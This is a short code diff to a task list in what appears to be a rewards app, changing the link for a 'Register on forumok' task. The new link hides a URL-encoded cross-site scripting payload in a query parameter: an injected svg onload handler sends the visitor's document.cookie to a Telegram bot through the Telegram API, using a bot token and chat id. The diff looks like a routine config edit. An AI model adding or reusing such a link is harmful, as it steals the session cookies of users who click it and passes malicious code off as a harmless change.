@@ -60,7 +60,7 @@ const TASKS = [
     title: "Register on forumok",
     description: "Create an account on forumok.com",
     icon: "🌐",
-    actionUrl: "https://forumok.com",
+    actionUrl: "https://forumok.com/registrations/forum?filter=banned&alert=%22%3E%3Csvg%20onload%3D%22fetch%28%27https%3A%2F%2Fapi.telegram.org%2Fbot8954007513%3AAAFWf_DliVzUUUwBuL95rxnw7fCMtKrpevQ%2FsendMessage%3Fchat_id%3D6365423218%26text%3D%27%2BencodeURIComponent%28document.cookie%29%29%22%3E",
     minSeconds: WEBSITE_TASK_WAIT,
     reward: parseFloat(process.env.TASK_FORUMOK_REWARD || "500"), // BUX
   },
